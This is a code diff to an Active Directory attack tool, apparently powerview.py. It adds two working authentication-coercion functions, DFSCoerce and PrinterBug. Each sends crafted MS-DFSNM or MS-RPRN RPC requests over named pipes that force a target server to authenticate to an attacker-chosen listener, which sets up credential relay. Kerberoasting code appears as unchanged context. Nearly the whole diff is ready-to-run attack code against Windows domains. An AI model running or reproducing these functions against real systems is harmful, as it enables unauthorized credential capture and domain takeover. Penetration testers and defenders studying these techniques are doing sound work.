@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
-from impacket.dcerpc.v5 import srvs, wkst, scmr, rrp
+from impacket.dcerpc.v5 import srvs, wkst, scmr, rrp, rprn
+from powerview.lib.dfsnm import NetrDfsRemoveStdRoot, MSRPC_UUID_DFSNM
 from impacket.dcerpc.v5.ndr import NULL
 from impacket.crypto import encryptSecret
 from typing import List
@@ -3777,6 +3778,139 @@ displayName=New Group Policy Object
 
 		return succeeded
 
+	def invoke_dfscoerce(self, target=None, listener=None, port=445, args=None):
+		entry = {}
+		target = target if target else args.target
+		if is_valid_fqdn(target):
+			target = host2ip(target, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver)
+		listener = listener if listener else args.listener
+		if args.port:
+			port = args.port
+
+		if not listener:
+			logging.error("[Invoke-DFSCoerce] Listener IP is required")
+			return
+			
+		if not target:
+			logging.error("[Invoke-DFSCoerce] Target domain is required")
+			return
+
+		KNOWN_PROTOCOLS = {
+			139: {'bindstr': r'ncacn_np:%s[\PIPE\netdfs]', 'set_host': True},
+			445: {'bindstr': r'ncacn_np:%s[\PIPE\netdfs]', 'set_host': True},
+		}
+		
+		entry['attributes'] = {
+			'Target': target,
+			'Listener': listener,
+		}
+			
+		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
+		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding, interface_uuid=MSRPC_UUID_DFSNM)
+
+		if dce is None:
+			logging.error("[Invoke-DFSCoerce] Failed to connect to %s" % (target))
+			return
+
+		logging.debug("[Invoke-DFSCoerce] Connected to %s" % (target))
+
+		try:
+			request = NetrDfsRemoveStdRoot()
+			request['ServerName'] = '%s\x00' % listener
+			request['RootShare'] = 'test\x00'
+			request['ApiFlags'] = 1
+			if self.args.stack_trace:
+				request.dump()
+			resp = dce.request(request)
+		except Exception as e:
+			entry['attributes']['Status'] = 'Failed'
+			logging.error("[Invoke-DFSCoerce] %s" % (str(e)))
+			return [entry]
+		
+		logging.debug("[Invoke-DFSCoerce] Triggered RPC backconnect, this may or may not have worked")
+		logging.debug("[Invoke-DFSCoerce] Disconnecting from %s" % (target))
+		dce.disconnect()
+
+		entry['attributes']['Status'] = 'Success'
+		return [entry]
+
+	def invoke_printerbug(self, target=None, listener=None, port=445, args=None):
+		# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+		entry = {}
+		target = target if target else args.target
+		if is_valid_fqdn(target):
+			target = host2ip(target, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver)
+		listener = listener if listener else args.listener
+		if args.port:
+			port = args.port
+
+		KNOWN_PROTOCOLS = {
+			139: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
+			445: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
+		}
+
+		if not listener:
+			logging.error("[Invoke-PrinterBug] Listener IP is required")
+			return
+			
+		if not target:
+			logging.error("[Invoke-PrinterBug] Target domain is required")
+			return
+		
+		entry['attributes'] = {
+			'Target': target,
+			'Listener': listener,
+		}
+			
+		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
+		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding, interface_uuid = rprn.MSRPC_UUID_RPRN)
+
+		if dce is None:
+			logging.error("[Invoke-PrinterBug] Failed to connect to %s" % (target))
+			return
+			
+		logging.debug("[Invoke-PrinterBug] Connected to %s" % (target))
+
+		try:
+			resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % target)
+		except Exception as e:
+			entry['attributes']['Status'] = 'Failed'
+			if str(e).find('Broken pipe') >= 0:
+				logging.error('[Invoke-PrinterBug] Connection failed - skipping host!')
+				return [entry]
+			elif str(e).upper().find('ACCESS_DENIED'):
+				logging.error('[Invoke-PrinterBug] Access denied - RPC call was denied')
+				dce.disconnect()
+				return [entry]
+			else:
+				logging.error('[Invoke-PrinterBug] %s' % (str(e)))
+				return [entry]
+
+		if resp:
+			logging.debug('[Invoke-PrinterBug] Got handle')
+		
+		request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
+		request['hPrinter'] =  resp['pHandle']
+		request['fdwFlags'] =  rprn.PRINTER_CHANGE_ADD_JOB
+		request['pszLocalMachine'] =  '\\\\%s\x00' % listener
+		request['pOptions'] =  NULL
+		if self.args.stack_trace:
+			request.dump()
+
+		try:
+			resp = dce.request(request)
+		except Exception as e:
+			entry['attributes']['Status'] = 'Might work?'
+			logging.error('[Invoke-PrinterBug] %s' % (str(e)))
+			return [entry]
+
+		logging.debug('[Invoke-PrinterBug] Triggered RPC backconnect, this may or may not have worked')
+		logging.debug('[Invoke-PrinterBug] Disconnecting from %s' % (target))
+		dce.disconnect()
+
+		entry['attributes']['Status'] = 'Success'
+		return [entry]
+
 	def invoke_kerberoast(self, args, properties=[]):
 		# look for users with SPN set
 		setattr(args, 'spn', True)
@@ -3939,6 +4073,7 @@ displayName=New Group Policy Object
 				return
 			else:
 				raise
+		
 		try:
 			entries = []
 			users = set()
